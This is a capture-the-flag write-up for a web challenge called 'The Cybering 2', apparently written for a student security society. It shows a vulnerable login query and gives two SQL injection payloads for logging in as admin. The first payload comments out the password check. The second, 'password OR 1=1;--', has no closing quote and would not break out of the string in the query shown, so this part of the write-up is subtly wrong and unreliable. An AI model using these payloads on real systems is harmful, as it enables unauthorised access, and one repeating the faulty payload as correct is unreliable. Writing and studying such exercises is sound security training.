# The Cybering 2
A web challenge all about sequels!

## Solving the challenge

**You want tickets now! But for that, you need admin privileges...**

It is necessary to use SQL (*sequel, hehe, see what I did there?!*) injection to log into the ```admin``` account.

This database query:
```
SELECT flag FROM users WHERE username = '{username}' AND password = '{password}';
```
is very simple to exploit - and a very common query.

It is necessary, to *verify* as admin to:
1. make your username ```admin``` and ignore the password variable...
<details>
<summary>Reveal SQL payload</summary>

*username*: ```admin'; --```
</details>

OR

2. make your username ```admin``` and set your password to anything but also include ```OR 1=1``` to always return *true*...
<details>
<summary>Reveal SQL payload</summary>

*username*: ```admin```

*password*: ```password OR 1=1;--```
</details>

<hr />

Created by **Peter Walker**<br />
President | Warwick Cyber Security Society<br />
[https://www.linkedin.com/in/p3ter-w/](https://www.linkedin.com/in/p3ter-w/)